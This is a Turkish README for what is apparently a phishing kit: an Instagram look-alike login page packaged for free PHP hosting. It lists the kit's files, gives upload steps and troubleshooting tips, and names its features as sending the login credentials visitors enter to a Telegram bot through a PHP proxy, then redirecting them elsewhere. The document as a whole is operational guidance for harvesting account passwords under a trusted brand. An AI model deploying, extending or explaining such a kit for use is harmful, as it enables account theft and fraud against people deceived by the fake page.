# Instagram Clone - Deploy Paketi

Bu paket, Instagram benzeri login sayfasının InfinityFree gibi PHP destekli web sunucularında çalışabilmesi için gerekli dosyaları içerir.

## Paket İçeriği

- `index.html`: Ana sayfa
- `telegram.js`: Telegram bot entegrasyonu (proxy.php kullanımı için düzenlenmiş)
- `proxy.php`: Telegram API ile güvenli iletişim için PHP proxy
- `/images/`: Logo ve simgeler
- `/assets/`: CSS ve JS dosyaları

## Kurulum Adımları

1. Bu paketteki tüm dosyaları web sunucunuzun kök dizinine yükleyin
2. Dosya/klasör yapısını bozmadan tüm içeriği bir arada tutun
3. Yükleme sonrası tarayıcıda açarak test edin

## Özellikler

- Doğrudan Telegram botuna mesaj gönderme
- Kullanıcı giriş bilgilerini Markdown formatında iletme
- Yönlendirme URL'i özelleştirme seçeneği
- PHP proxy ile 403 Forbidden hatalarını önleme
- Tamamen statik dosyalar ile çalışabilme

## Güvenlik Notları

- Bu dosyalar arasında Telegram bot token ve chat ID değerleri telegram.js içerisinde bulunmaktadır
- Gerçek kullanımda bu dosyalara sadece yetkili kişilerin erişebildiğinden emin olun
- Proxy kullanımı, InfinityFree gibi bazı ücretsiz hostinglerde Telegram API ile iletişim sorunlarını çözer

## Sorun Giderme

Giriş yapılıp bilgiler gönderilmediğinde:
1. PHP sürümünüzün 7.0 veya üzeri olduğunu kontrol edin
2. cURL eklentisinin PHP kurulumunda etkin olduğunu doğrulayın
3. Tarayıcı konsolunda hata mesajlarını inceleyin
4. Proxy.php dosyasının çalışma izinlerinin doğru ayarlandığından emin olun (644)

## İletişim

Herhangi bir sorun yaşarsanız, destek için [bu formu](https://formspree.io/f/mwkglabz) kullanabilirsiniz.